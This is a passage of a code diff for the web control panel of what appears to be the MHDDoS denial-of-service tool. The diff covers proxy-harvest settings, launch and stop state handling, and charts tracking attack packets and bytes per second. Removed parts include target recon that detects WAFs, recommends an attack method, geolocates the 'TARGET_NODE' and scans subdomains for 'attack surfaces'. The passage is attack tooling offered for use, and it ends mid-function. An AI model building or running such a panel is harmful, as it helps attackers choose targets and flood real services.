+    <div id="config-modal" class="fixed inset-0 z-[2000] flex items-center justify-center bg-black/80 backdrop-blur-sm hidden opacity-0 transition-opacity duration-300">
+        <div class="glass-card bg-slate-900 w-full max-w-xl rounded-3xl p-8 border border-white/10 shadow-2xl relative translate-y-4 transition-transform duration-300" id="config-modal-content">
+            <button onclick="closeConfigModal()" class="absolute top-6 right-6 text-slate-500 hover:text-white transition-colors">
+                <span class="material-symbols-rounded">close</span>
+            </button>
+            <div class="mb-6 flex items-center gap-4">
                 <div class="size-10 bg-primary/10 rounded-xl flex items-center justify-center text-primary border border-primary/20">
-                    <span class="material-symbols-rounded">cloud_download</span>
+                    <span class="material-symbols-rounded">settings_ethernet</span>
                 </div>
                 <div>
-                    <h2 class="text-xl font-black uppercase tracking-wider text-white">Proxy Harvest Configuration</h2>
-                    <p class="text-xs font-mono text-slate-400 mt-1">Define external sources for Auto-Harvest protocol.</p>
+                    <h2 class="text-xl font-black uppercase tracking-wider text-white">Proxy Harvest Config</h2>
+                    <p class="text-xs font-mono text-slate-400 mt-1">Define global tactical asset providers.</p>
                 </div>
             </div>
-            <div class="group relative cursor-help">
-                <span class="material-symbols-rounded text-slate-500 hover:text-primary transition-colors">info</span>
-                <div class="absolute right-0 top-full mt-2 w-64 p-3 bg-slate-800 border border-slate-700 rounded-xl shadow-xl text-[10px] text-slate-300 opacity-0 invisible group-hover:opacity-100 group-hover:visible transition-all z-50">
-                    <p class="font-bold text-white mb-1">Supported Formats:</p>
-                    <ul class="list-disc pl-4 space-y-1">
-                        <li><strong>Web URLs:</strong> http:// or https:// ending with raw text proxy list</li>
-                        <li><strong>Local Files:</strong> Absolute paths (e.g. C:\path\to\all.txt)</li>
-                    </ul>
+            
+            <div id="config-sources-container" class="space-y-3 mb-8 max-h-[300px] overflow-y-auto custom-scrollbar p-1">
+                <!-- Sources rendered here -->
+            </div>
+
+            <div class="flex items-center justify-between pt-6 border-t border-white/5">
+                <button onclick="addConfigSource()" class="text-xs font-bold text-primary hover:text-primary-light flex items-center gap-2 transition-colors">
+                    <span class="material-symbols-rounded text-lg">add_circle</span>
+                    Add Provider
+                </button>
+                <div class="flex gap-3">
+                    <button onclick="closeConfigModal()" class="px-6 py-2 rounded-xl text-xs font-bold text-slate-400 hover:text-white transition-colors">Cancel</button>
+                    <button onclick="saveProxyConfig()" class="px-8 py-2 bg-primary text-slate-950 rounded-xl font-black text-xs uppercase tracking-widest hover:bg-primary-light transition-all shadow-lg shadow-primary/20">Save Matrix</button>
                 </div>
             </div>
-        </div>
-        
-        <div id="config-modal-error" class="mb-4 text-xs font-bold text-danger hidden bg-danger/10 border border-danger/20 p-3 rounded-xl flex items-center gap-2">
-            <span class="material-symbols-rounded text-sm">warning</span>
-            <span id="config-modal-error-text"></span>
-        </div>
-
-        <div class="space-y-3 max-h-[50vh] overflow-y-auto pr-2 custom-scrollbar" id="config-sources-container">
-            <!-- Dynamic Content -->
-        </div>
-
-        <div class="mt-8 flex justify-between items-center border-t border-white/10 pt-6">
-            <button onclick="addConfigSource()" class="px-5 py-2.5 rounded-xl bg-slate-800 text-slate-300 hover:bg-slate-700 transition-colors text-[11px] font-bold uppercase tracking-wider flex items-center gap-2">
-                <span class="material-symbols-rounded text-[16px]">add</span> Add Resource Endpoint
-            </button>
-            <div class="flex gap-3">
-                <button onclick="closeConfigModal()" class="px-6 py-2.5 rounded-xl bg-transparent border border-slate-700 text-slate-400 hover:bg-slate-800 hover:text-white transition-colors text-[11px] font-bold uppercase tracking-wider">
-                    Cancel
-                </button>
-                <button onclick="saveConfigModal()" class="px-8 py-2.5 rounded-xl bg-primary text-slate-950 hover:bg-primary-light transition-colors text-[11px] font-black uppercase tracking-wider shadow-lg shadow-primary/20 flex items-center gap-2">
-                    <span class="material-symbols-rounded text-[16px]">save</span> Save Matrix
-                </button>
-            </div>
+            <p id="config-modal-error" class="hidden text-danger text-[10px] font-mono mt-4 text-center uppercase font-bold"></p>
         </div>
     </div>
-</div>
 
-<script>
-    // --- UI State Management ---
-    const STATE = {
-        IDLE: 'idle',
-        STARTING: 'starting',
-        RUNNING: 'running',
-        STOPPING: 'stopping'
-    };
+    <script>
+        const term = document.getElementById('terminal-content');
+        const STATE = { IDLE: 'idle', STARTING: 'starting', RUNNING: 'running', STOPPING: 'stopping' };
+        let currentAppState = STATE.IDLE;
+        let ws = null;
+        let currentLogFilter = 'ALL';
+        const LOG_LEVELS = { 'DEBUG': 0, 'INFO': 1, 'ERROR': 2 };
+        let currentLogLevel = localStorage.getItem('mhddos_log_level') || 'INFO';
 
-    function setAppState(state) {
-        document.body.setAttribute('data-app-state', state);
-        
-        const startBtn = document.getElementById('start-btn');
-        const stopBtn = document.getElementById('stop-btn');
-        const loader = document.getElementById('action-loader');
-        
-        switch(state) {
-            case STATE.IDLE:
-                startBtn.classList.remove('hidden');
-                stopBtn.classList.add('hidden');
-                loader.classList.add('hidden');
-                startBtn.disabled = false;
-                break;
-            case STATE.STARTING:
-                startBtn.classList.add('hidden');
-                stopBtn.classList.add('hidden');
-                loader.classList.remove('hidden');
-                break;
-            case STATE.RUNNING:
-                startBtn.classList.add('hidden');
-                stopBtn.classList.remove('hidden');
-                loader.classList.add('hidden');
-                stopBtn.disabled = false;
-                break;
-            case STATE.STOPPING:
-                startBtn.classList.add('hidden');
-                stopBtn.classList.remove('hidden');
-                stopBtn.disabled = true;
-                loader.classList.add('hidden');
-                break;
-        }
-    }
+        // --- UI State Management ---
+        function setAppState(state) {
+            currentAppState = state;
+            document.body.dataset.appState = state;
+            const startBtn = document.getElementById('start-btn');
+            const stopBtn = document.getElementById('stop-btn');
+            const loader = document.getElementById('action-loader');
+            // Only disable inputs & buttons inside the tactical sidebar configuration area
+            const inputs = document.querySelectorAll('aside input, aside select, aside button:not(#stop-btn)');
 
-    // --- Core Logic ---
-    let ws;
-    let currentLogFilter = 'ALL';
-    let peakRps = 0;
-    let peakBps = 0;
-    let peakLatency = 0;
-    const term = document.getElementById('terminal-content');
-    
-    // Charts Configuration
-    const buildChartConfig = (color, label) => ({
-        type: 'line',
-        data: {
-            labels: Array(60).fill(''),
-            datasets: [{
-                label: label,
-                data: Array(60).fill(0),
-                borderColor: color,
-                borderWidth: 2,
-                fill: true,
-                backgroundColor: color + '11',
-                pointRadius: 0,
-                tension: 0.4
-            }]
-        },
-        options: {
-            responsive: true,
-            maintainAspectRatio: false,
-            animation: { duration: 400 },
-            scales: {
-                x: { display: false },
-                y: {
-                    beginAtZero: true,
-                    grid: { color: 'rgba(255, 255, 255, 0.03)', drawBorder: false },
-                    ticks: { color: '#475569', font: { size: 9, family: 'Fira Code' }, maxTicksLimit: 4 }
-                }
-            },
-            plugins: { legend: { display: false } }
-        }
-    });
-
-    const rpsChart = new Chart(document.getElementById('rpsChart'), buildChartConfig('#10b981', 'PPS'));
-    const bpsChart = new Chart(document.getElementById('bpsChart'), buildChartConfig('#3b82f6', 'BPS'));
-    const latencyChart = new Chart(document.getElementById('latencyChart'), buildChartConfig('#f59e0b', 'Latency'));
-
-    function updateMetrics(rpsStr, bpsStr, latStr) {
-        let valRps = parseFloat(rpsStr.replace(/[^0-9.]/g, ''));
-        if (isNaN(valRps)) valRps = 0;
-        if (rpsStr.toLowerCase().includes('k')) valRps *= 1000;
-        else if (rpsStr.toLowerCase().includes('m')) valRps *= 1000000;
-        
-        if (valRps > peakRps) {
-            peakRps = valRps;
-            document.getElementById('peak-rps').textContent = rpsStr;
-        }
-        document.getElementById('current-rps').textContent = rpsStr;
-        rpsChart.data.datasets[0].data.push(valRps);
-        rpsChart.data.datasets[0].data.shift();
-        rpsChart.update('none');
-
-        document.getElementById('current-bps').textContent = bpsStr;
-        let valBps = parseFloat(bpsStr.replace(/[^0-9.]/g, ''));
-        if (isNaN(valBps)) valBps = 0;
-        
-        // Normalize everything to Bytes for the chart
-        const bpsLower = bpsStr.toLowerCase();
-        if (bpsLower.includes('gb')) valBps *= 1024 * 1024 * 1024;
-        else if (bpsLower.includes('mb')) valBps *= 1024 * 1024;
-        else if (bpsLower.includes('kb')) valBps *= 1024;
-        // if just 'b' or 'bytes', it remains valBps
-        
-        if (valBps > peakBps) {
-            peakBps = valBps;
-            document.getElementById('peak-bps').textContent = bpsStr;
-        }
-        bpsChart.data.datasets[0].data.push(valBps);
-        bpsChart.data.datasets[0].data.shift();
-        bpsChart.update('none');
-
-        if (latStr) {
-            document.getElementById('current-latency').textContent = latStr;
-            let valLat = parseFloat(latStr.replace(/[^0-9.]/g, ''));
-            if (isNaN(valLat)) valLat = 0;
-            if (valLat > peakLatency) {
-                peakLatency = valLat;
-                document.getElementById('peak-latency').textContent = latStr;
+            switch(state) {
+                case STATE.IDLE:
+                    startBtn.classList.remove('hidden');
+                    stopBtn.classList.add('hidden');
+                    loader.classList.add('hidden');
+                    inputs.forEach(i => { i.disabled = false; i.style.opacity = "1"; });
+                    document.getElementById('header-status-text').textContent = "SYSTEM_READY";
+                    document.getElementById('header-status-text').className = "text-xs font-mono font-bold text-primary";
+                    break;
+                case STATE.STARTING:
+                    startBtn.classList.add('hidden');
+                    stopBtn.classList.add('hidden');
+                    loader.classList.remove('hidden');
+                    inputs.forEach(i => { i.disabled = true; i.style.opacity = "0.5"; });
+                    break;
+                case STATE.RUNNING:
+                    startBtn.classList.add('hidden');
+                    stopBtn.classList.remove('hidden');
+                    loader.classList.add('hidden');
+                    stopBtn.disabled = false;
+                    inputs.forEach(i => { if(i.id !== 'log-level-selector') { i.disabled = true; i.style.opacity = "0.5"; } });
+                    document.getElementById('header-status-text').textContent = "SEQUENCE_ACTIVE";
+                    document.getElementById('header-status-text').className = "text-xs font-mono font-bold text-warning animate-pulse";
+                    break;
+                case STATE.STOPPING:
+                    startBtn.classList.add('hidden');
+                    stopBtn.classList.remove('hidden');
+                    stopBtn.disabled = true;
+                    loader.classList.add('hidden');
+                    inputs.forEach(i => { i.disabled = true; i.style.opacity = "0.5"; });
+                    break;
             }
-            latencyChart.data.datasets[0].data.push(valLat);
-            latencyChart.data.datasets[0].data.shift();
+        }
+
+        // --- Maps ---
+        let map = null;
+        let marker = null;
+
+        function initMap(lat = 0, lon = 0) {
+            if (map) map.remove();
+            map = L.map('tactical-map', {
+                center: [lat, lon],
+                zoom: 3,
+                zoomControl: false,
+                attributionControl: false
+            });
+            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+                maxZoom: 19
+            }).addTo(map);
+            if(lat !== 0) marker = L.circleMarker([lat, lon], { color: '#10b981', radius: 8, fillOpacity: 0.6 }).addTo(map);
+        }
+
+        // --- Time-Series Analytics & Charts ---
+        let historyBuffer = [];
+        try {
+            const stored = localStorage.getItem('mhddos_telemetry');
+            if (stored) {
+                historyBuffer = JSON.parse(stored);
+                // Prune records older than 1 Week
+                const cutoff = Date.now() - (604800 * 1000);
+                historyBuffer = historyBuffer.filter(d => d.time >= cutoff);
+            }
+        } catch (e) {
+            console.error("Failed to parse telemetry history.", e);
+        }
+        let currentTimeframe = 3600; // Default to 1H (in seconds)
+        // Max buffer: 1W = 7 * 24 * 3600 = 604800 points. 
+        const MAX_BUFFER_SIZE = 604800;
+
+        const tfMap = {
+            '1M': 60,
+            '5M': 300,
+            '15M': 900,
+            '1H': 3600,
+            '4H': 14400,
+            '1D': 86400,
+            '1W': 604800
+        };
+
+        function setTimeframe(tfString) {
+            currentTimeframe = tfMap[tfString] || 3600;
+            
+            // UI styling
+            document.querySelectorAll('.tf-btn').forEach(btn => {
+                btn.className = "tf-btn px-4 py-1.5 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all duration-300 text-slate-500 hover:text-white";
+            });
+            const active = document.getElementById(`tf-${tfString}`);
+            if (active) {
+                active.className = "tf-btn active px-4 py-1.5 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all duration-300 bg-primary/20 text-primary border border-primary/30 shadow-[0_0_10px_rgba(16,185,129,0.2)]";
+            }
+            
+            renderCharts();
+        }
+
+        const chartConfig = (color) => ({
+            type: 'line',
+            data: {
+                labels: [],
+                datasets: [{
+                    data: [],
+                    borderColor: color,
+                    borderWidth: 2,
+                    pointRadius: 0,
+                    pointHoverRadius: 4,
+                    tension: 0.2, // Smooth curves
+                    fill: true,
+                    backgroundColor: (context) => {
+                        const ctx = context.chart.ctx;
+                        const gradient = ctx.createLinearGradient(0, 0, 0, 150);
+                        gradient.addColorStop(0, color + '40');
+                        gradient.addColorStop(1, color + '00');
+                        return gradient;
+                    }
+                }]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: false,
+                plugins: { 
+                    legend: { display: false },
+                    tooltip: {
+                        mode: 'index',
+                        intersect: false,
+                        backgroundColor: 'rgba(15, 23, 42, 0.9)',
+                        titleColor: '#94a3b8',
+                        bodyColor: '#f1f5f9',
+                        borderColor: 'rgba(255, 255, 255, 0.1)',
+                        borderWidth: 1,
+                        padding: 10,
+                        titleFont: { family: '"Fira Code", monospace', size: 10 },
+                        bodyFont: { family: '"Fira Code", monospace', size: 12 },
+                        callbacks: {
+                            label: function(context) {
+                                let val = context.raw;
+                                if (color === '#10b981') return ` PPS: ${val.toLocaleString()}`;
+                                if (color === '#3b82f6') {
+                                    if (val > 1024*1024*1024) return ` BPS: ${(val/(1024*1024*1024)).toFixed(2)} GB/s`;
+                                    if (val > 1024*1024) return ` BPS: ${(val/(1024*1024)).toFixed(2)} MB/s`;
+                                    if (val > 1024) return ` BPS: ${(val/1024).toFixed(2)} KB/s`;
+                                    return ` BPS: ${val.toFixed(2)} B/s`;
+                                }
+                                return ` Latency: ${val.toFixed(2)}ms`;
+                            }
+                        }
+                    }
+                },
+                scales: {
+                    x: {
+                        display: true,
+                        grid: { color: 'rgba(255, 255, 255, 0.02)' },
+                        ticks: { color: '#64748b', font: { family: '"Fira Code", monospace', size: 9 }, maxTicksLimit: 6 }
+                    },
+                    y: { 
+                        display: false,
+                        grid: { display: false },
+                        suggestedMin: 0
+                    }
+                },
+                animation: false,
+                interaction: { mode: 'nearest', axis: 'x', intersect: false }
+            }
+        });
+
+        const rpsChart = new Chart(document.getElementById('rpsChart'), chartConfig('#10b981'));
+        const bpsChart = new Chart(document.getElementById('bpsChart'), chartConfig('#3b82f6'));
+        const latencyChart = new Chart(document.getElementById('latencyChart'), chartConfig('#f59e0b'));
+
+        let peakRPS = 0;
+        let peakBPS = 0;
+        let peakLat = 0;
+
+        // Render historical data initially if available
+        if (historyBuffer.length > 0) {
+            setTimeout(renderCharts, 100);
+        }
+
+        function formatTimeLabel(timestamp, timeframe) {
+            const d = new Date(timestamp);
+            if (timeframe > 86400) { // > 1D
+                return `${d.getDate()}/${d.getMonth()+1} ${d.getHours().toString().padStart(2, '0')}:00`;
+            } else if (timeframe > 3600) { // > 1H
+                return `${d.getHours().toString().padStart(2, '0')}:${d.getMinutes().toString().padStart(2, '0')}`;
+            }
+            return `${d.getHours().toString().padStart(2, '0')}:${d.getMinutes().toString().padStart(2, '0')}:${d.getSeconds().toString().padStart(2, '0')}`;
+        }
+
+        function downsample(data, targetLength) {
+            if (data.length <= targetLength) return data;
+            const factor = Math.ceil(data.length / targetLength);
+            const res = [];
+            for (let i = 0; i < data.length; i += factor) {
+                const chunk = data.slice(i, i + factor);
+                const avg = {
+                    time: chunk[chunk.length - 1].time,
+                    rps: chunk.reduce((s, c) => s + c.rps, 0) / chunk.length,
+                    bps: chunk.reduce((s, c) => s + c.bps, 0) / chunk.length,
+                    lat: chunk.reduce((s, c) => s + c.lat, 0) / chunk.length
+                };
+                res.push(avg);
+            }
+            return res;
+        }
+
+        function renderCharts() {
+            const now = Date.now();
+            const cutoff = now - (currentTimeframe * 1000);
+            
+            // Filter data within timeframe
+            let visibleData = historyBuffer.filter(d => d.time >= cutoff);
+            
+            // Pad if necessary (for small initial data so charts look flowing)
+            if (visibleData.length < 2) {
+                visibleData = [
+                    { time: cutoff, rps: 0, bps: 0, lat: 0 },
+                    { time: now, rps: visibleData[0]?.rps||0, bps: visibleData[0]?.bps||0, lat: visibleData[0]?.lat||0 }
+                ];
+            }
+
+            // Downsample for performance (limit to ~120 points per chart)
+            const sampled = downsample(visibleData, 120);
+
+            const labels = sampled.map(d => formatTimeLabel(d.time, currentTimeframe));
+            const rpsData = sampled.map(d => d.rps);
+            const bpsData = sampled.map(d => d.bps);
+            const latData = sampled.map(d => d.lat);
+
+            rpsChart.data.labels = labels;
+            rpsChart.data.datasets[0].data = rpsData;
+            rpsChart.update('none');
+
+            bpsChart.data.labels = labels;
+            bpsChart.data.datasets[0].data = bpsData;
+            bpsChart.update('none');
+
+            latencyChart.data.labels = labels;
+            latencyChart.data.datasets[0].data = latData;
             latencyChart.update('none');
         }
-    }
 
-    // --- Log Control Logic ---
-    const LOG_LEVELS = { 'DEBUG': 0, 'INFO': 1, 'ERROR': 2 };
-    let currentLogLevel = localStorage.getItem('mhddos_log_level') || 'INFO';
+        function updateMetrics(rpsStr, bpsStr, latStr) {
+            let valRps = parseFloat(rpsStr.replace(/[^0-9.]/g, ''));
+            if (isNaN(valRps)) valRps = 0;
+            if (rpsStr.toLowerCase().includes('k')) valRps *= 1000;
+            else if (rpsStr.toLowerCase().includes('m')) valRps *= 1000000;
 
-    function getMsgLevel(msg) {
-        if (msg.includes("[!]") || msg.includes("ENGINE_CRASH") || msg.includes("API_FAIL") || msg.includes("ERROR")) return 'ERROR';
-        if (msg.includes("[*]") || msg.includes("LAUNCHING") || msg.includes("DEPLOYED") || msg.includes("COMMAND") || msg.includes("Scoring complete")) return 'INFO';
-        return 'DEBUG';
-    }
+            document.getElementById('current-rps').textContent = rpsStr;
+            if (valRps > peakRPS) peakRPS = valRps, document.getElementById('peak-rps').textContent = rpsStr;
 
-    function setLogLevel(level) {
-        currentLogLevel = level;
-        localStorage.setItem('mhddos_log_level', level);
-        refreshLogVisibility();
-    }
+            document.getElementById('current-bps').textContent = bpsStr;
+            let valBps = parseFloat(bpsStr.replace(/[^0-9.]/g, ''));
+            if (isNaN(valBps)) valBps = 0;
+            const bpsLower = bpsStr.toLowerCase();
+            if (bpsLower.includes('gb')) valBps *= 1024 * 1024 * 1024;
+            else if (bpsLower.includes('mb')) valBps *= 1024 * 1024;
+            else if (bpsLower.includes('kb')) valBps *= 1024;
+            if (valBps > peakBPS) peakBPS = valBps, document.getElementById('peak-bps').textContent = bpsStr;
 
-    function refreshLogVisibility() {
-        const filter = currentLogFilter;
-        const levelThreshold = LOG_LEVELS[currentLogLevel];
-        
-        document.querySelectorAll('.log-entry').forEach(entry => {
-            const entryType = entry.dataset.type;
-            const entryLevel = entry.dataset.level;
-            const entryLevelVal = LOG_LEVELS[entryLevel] || 0;
-            
-            const matchesFilter = (filter === 'ALL' || entryType === filter);
-            const matchesLevel = (entryLevelVal >= levelThreshold);
-            
-            entry.style.display = (matchesFilter && matchesLevel) ? 'flex' : 'none';
-        });
-    }
-
-    function appendLog(msg, type = 'SYSTEM') {
-        if (!msg) return;
-        
-        // Handle batch messages from throttled backend
-        const lines = msg.split('\n');
-        if (lines.length > 1) {
-            lines.forEach(line => appendLog(line, type));
-            return;
-        }
-
-        const cleanMsg = msg.replace(/\x1B\[[0-9;]*[mK]/g, '').trim();
-        if (!cleanMsg) return;
-
-        // Try to parse metrics
-        const rpsMatch = cleanMsg.match(/PPS:\s*([^,]+)/i);
-        const bpsMatch = cleanMsg.match(/BPS:\s*([^,]+)/i);
-        const latMatch = cleanMsg.match(/Latency:\s*([\d\.]+ms|TIMEOUT)/i);
-        
-        if (rpsMatch || bpsMatch) {
-            updateMetrics(
-                rpsMatch ? rpsMatch[1] : "0", 
-                bpsMatch ? bpsMatch[1].split(',')[0].trim() : "0 B",
-                latMatch ? latMatch[1] : "0 ms"
-            );
-            return;
-        }
-
-        const entry = document.createElement('div');
-        let logType = type;
-        
-        if (cleanMsg.includes("[!]")) logType = 'ERROR';
-        else if (cleanMsg.includes("LAUNCHING") || cleanMsg.includes("DEPLOYED")) logType = 'ATTACK';
-        else if (cleanMsg.includes("[*]")) logType = 'SYSTEM';
-
-        const entryLevel = getMsgLevel(cleanMsg);
-        entry.dataset.level = entryLevel;
-        entry.dataset.type = logType;
-
-        const levelThreshold = LOG_LEVELS[currentLogLevel];
-        const matchesLevel = (LOG_LEVELS[entryLevel] >= levelThreshold);
-        const matchesFilter = (currentLogFilter === 'ALL' || logType === currentLogFilter);
-
-        if (!(matchesLevel && matchesFilter)) entry.style.display = 'none';
-
-        entry.className = `log-entry flex gap-4 ${logType === 'ERROR' ? 'text-danger' : entryLevel === 'DEBUG' ? 'text-slate-500 opacity-60' : 'text-slate-400'}`;
-
-        const label = document.createElement('span');
-        label.className = `shrink-0 font-bold w-20 ${logType === 'ERROR' ? 'text-danger' : logType === 'ATTACK' ? 'text-primary' : 'text-slate-600'}`;
-        label.textContent = `[${logType}]`;
-
-        const content = document.createElement('span');
-        content.className = "flex-1 break-all";
-        content.textContent = cleanMsg;
-
-        entry.appendChild(label);
-        entry.appendChild(content);
-        term.appendChild(entry);
-        
-        // Auto-scroll logic
-        const isAtBottom = term.scrollHeight - term.clientHeight <= term.scrollTop + 50;
-        if (isAtBottom) term.scrollTop = term.scrollHeight;
-        
-        // Virtualization: Keep last 1000 lines for stability
-        if (term.childNodes.length > 1000) {
-            for (let i = 0; i < 10; i++) {
-                if (term.firstChild) term.removeChild(term.firstChild);
+            let valLat = 0;
+            if (latStr) {
+                document.getElementById('current-latency').textContent = latStr;
+                valLat = parseFloat(latStr.replace(/[^0-9.]/g, ''));
+                if (isNaN(valLat)) valLat = 0;
+                if (valLat > peakLat) peakLat = valLat, document.getElementById('peak-latency').textContent = latStr;
             }
-        }
-    }
 
-    function setLogFilter(filter) {
-        currentLogFilter = filter;
-        document.querySelectorAll('.filter-chip').forEach(c => c.classList.remove('active', 'bg-primary', 'text-slate-950'));
-        document.querySelectorAll('.filter-chip').forEach(c => c.classList.add('text-slate-500'));
-        
-        const activeChip = document.getElementById(`filter-${filter}`);
-        activeChip.classList.add('active', 'bg-primary', 'text-slate-950');
-        activeChip.classList.remove('text-slate-500');
-
-        refreshLogVisibility();
-    }
-
-    function setupWebSocket() {
-        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-        ws = new WebSocket(`${protocol}//${window.location.host}/ws/logs`);
-        
-        ws.onopen = () => {
-            document.getElementById('connection-status').className = "size-2 rounded-full bg-primary pulse-active";
-            document.getElementById('header-status-text').textContent = "SYSTEM_READY";
-            document.getElementById('header-status-text').className = "text-xs font-mono font-bold text-primary";
-            appendLog("Encryption link established. Neural uplink stable.");
-        };
-        
-        ws.onmessage = (e) => {
-            const msg = e.data;
-            appendLog(msg);
-            if (msg.includes("COMMAND DEPLOYED")) setAppState(STATE.RUNNING);
-            if (msg.includes("COMMAND TERMINATED")) setAppState(STATE.IDLE);
-        };
-        
-        ws.onclose = () => {
-            document.getElementById('connection-status').className = "size-2 rounded-full bg-danger";
-            document.getElementById('header-status-text').textContent = "LINK_LOST";
-            document.getElementById('header-status-text').className = "text-xs font-mono font-bold text-danger";
-            setTimeout(setupWebSocket, 3000);
-        };
-    }
-
-    // --- Recon & Mapping Logic ---
-    let tacticalMap;
-    let targetMarker;
-
-    function initTacticalMap(lat = 0, lon = 0) {
-        if (tacticalMap) tacticalMap.remove();
-        tacticalMap = L.map('tactical-map', {
-            zoomControl: false,
-            attributionControl: false
-        }).setView([lat, lon], 2);
-
-        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-            maxZoom: 19
-        }).addTo(tacticalMap);
-    }
-
-    async function analyzeTarget() {
-        const target = document.getElementById('target').value;
-        if (!target) return appendLog("[!] VALIDATION_FAILED: Destination target required for analysis.", "ERROR");
-        
-        appendLog(`[*] INITIATING RADAR SCAN: Analyzing infrastructure for ${target}...`);
-        
-        // 1. Analyze WAF & Method
-        try {
-            const res = await fetch('/api/recon/analyze', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ target })
+            // Push to history buffer
+            historyBuffer.push({
+                time: Date.now(),
+                rps: valRps,
+                bps: valBps,
+                lat: valLat
             });
-            const data = await res.json();
-            if (!res.ok || data.status !== 'success') {
-                appendLog(`[!] SCAN_ERR: ${data.message || data.detail || 'Endpoint unreachable. Please restart the application to apply the latest update.'}`, "ERROR");
-                return;
-            }
-            appendLog(`[*] RADAR LOCK: Detected Stack = [${data.server}], HTTP ${data.status_code}`);
-            appendLog(`[*] TACTICAL RECOMMENDATION: Applying ${data.recommendation} sequence.`);
-            document.getElementById('method').value = data.recommendation;
-            updateVisibility();
-            
-            // Update Badge
-            const badgeContainer = document.getElementById('recon-waf-badge');
-            const wafClass = (data.server || '').toLowerCase().replace(/[\/\s]/g, '');
-            badgeContainer.innerHTML = `<span class="recon-badge badge-${wafClass}">${data.server} PROTECTED</span>`;
-        } catch (e) { appendLog(`[!] API_FAIL: ${e.message}`, "ERROR"); }
 
-        // 2. Geo-IP Recon
-        try {
-            const res = await fetch(`/api/recon/geo?target=${encodeURIComponent(target)}`);
-            if (!res.ok) return;
-            const data = await res.json();
-            if (data.status === 'success') {
-                document.getElementById('geo-isp').textContent = data.isp || data.org || 'UNKNOWN';
-                document.getElementById('geo-loc').textContent = `${data.city || 'Unknown'}, ${data.country || 'Unknown'}`;
-                
-                if (data.lat && data.lon) {
-                    if (!tacticalMap) initTacticalMap(data.lat, data.lon);
-                    tacticalMap.setView([data.lat, data.lon], 10);
-                    if (targetMarker) targetMarker.remove();
-                    targetMarker = L.circleMarker([data.lat, data.lon], {
-                        radius: 8,
-                        fillColor: "#10b981",
-                        color: "#fff",
-                        weight: 2,
-                        opacity: 1,
-                        fillOpacity: 0.8
-                    }).addTo(tacticalMap).bindPopup(`<b>TARGET_NODE</b><br>${data.ip || 'Unknown IP'}`).openPopup();
+            // Trim buffer to max size (1W) to prevent memory leak
+            if (historyBuffer.length > MAX_BUFFER_SIZE) {
+                historyBuffer.shift();
+            }
+
+            renderCharts();
+            
+            // Throttle save to localStorage (every 5 seconds) to prevent UI thread lag
+            if (!window.lastTelemetrySave || Date.now() - window.lastTelemetrySave > 5000) {
+                try {
+                    // Downsample to max 2000 points before stringifying to save space & serialization overhead
+                    const dataToSave = historyBuffer.length > 2000 ? downsample(historyBuffer, 2000) : historyBuffer;
+                    localStorage.setItem('mhddos_telemetry', JSON.stringify(dataToSave));
+                } catch(e) {
+                    console.error("Telemetry save fail", e);
                 }
+                window.lastTelemetrySave = Date.now();
             }
-        } catch (e) { console.error("Geo-IP Error:", e); }
-    }
+        }
 
-    async function scanSubdomains() {
-        const target = document.getElementById('target').value;
-        const btn = document.getElementById('subdomain-scan-btn');
-        const resultsTable = document.getElementById('subdomain-results');
-        
-        if (!target) return alert("Target required for surface scan.");
-        
-        btn.disabled = true;
-        btn.innerHTML = '<span class="material-symbols-rounded text-sm animate-spin">refresh</span> Scanning...';
-        resultsTable.innerHTML = '<tr><td colspan="3" class="py-12 text-center text-primary animate-pulse font-bold uppercase tracking-widest">Discovering attack surfaces...</td></tr>';
+        // --- Core Logic ---
+        function getMsgLevel(msg) {
+            if (msg.includes("[!]") || msg.includes("ENGINE_CRASH") || msg.includes("API_FAIL") || msg.includes("ERROR")) return 'ERROR';
+            if (msg.includes("[*]") || msg.includes("LAUNCHING") || msg.includes("DEPLOYED") || msg.includes("COMMAND") || msg.includes("Scoring complete")) return 'INFO';
+            return 'DEBUG';
+        }
 
-        try {
-            const res = await fetch('/api/recon/subdomains', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ target })
-            });
-            const data = await res.json();
+        function setLogLevel(level) {
+            currentLogLevel = level;
+            localStorage.setItem('mhddos_log_level', level);
+            refreshLogVisibility();
+        }
+
+        function refreshLogVisibility() {
+            const filter = currentLogFilter;
+            const levelThreshold = LOG_LEVELS[currentLogLevel];
             
-            if (!res.ok || data.status !== 'success') {
-                resultsTable.innerHTML = `<tr><td colspan="3" class="py-12 text-center text-danger">SCAN_FAILED: ${data.message || data.detail || 'Endpoint unreachable. Please restart the application.'}</td></tr>`;
+            document.querySelectorAll('.log-entry').forEach(entry => {
+                const entryType = entry.dataset.type;
+                const entryLevel = entry.dataset.level;
+                const entryLevelVal = LOG_LEVELS[entryLevel] || 0;
+                
+                const matchesFilter = (filter === 'ALL' || entryType === filter);
+                const matchesLevel = (entryLevelVal >= levelThreshold);
+                
+                entry.style.display = (matchesFilter && matchesLevel) ? 'flex' : 'none';
+            });
+        }
+
+        function appendLog(msg, type = 'SYSTEM') {
+            if (!msg) return;
+            const lines = msg.split('\n');
+            if (lines.length > 1) {
+                lines.forEach(line => appendLog(line, type));
                 return;
             }
 
-            if (data.subdomains && data.subdomains.length > 0) {
-                resultsTable.innerHTML = data.subdomains.map(sub => `
-                    <tr>
-                        <td class="py-3 px-4 font-bold text-slate-300 underline underline-offset-4 decoration-slate-800 cursor-pointer hover:text-primary transition-colors" onclick="setTarget('${sub.subdomain}')">${sub.subdomain}</td>
-                        <td class="py-3 px-4 text-slate-500">${sub.ip}</td>
-                        <td class="py-3 px-4 text-right">
-                            <button onclick="setTarget('${sub.subdomain}', true)" class="px-2 py-1 bg-slate-800 hover:bg-primary hover:text-slate-950 rounded border border-white/5 transition-all">LOCK</button>
-                        </td>
-                    </tr>
-                `).join('');
-            } else {
-                resultsTable.innerHTML = '<tr><td colspan="3" class="py-12 text-center text-slate-600 italic">No additional endpoints identified.</td></tr>';
+            const cleanMsg = msg.replace(/\x1B\[[0-9;]*[mK]/g, '').trim();
+            if (!cleanMsg) return;
+
+            const rpsMatch = cleanMsg.match(/PPS:\s*([^,]+)/i);
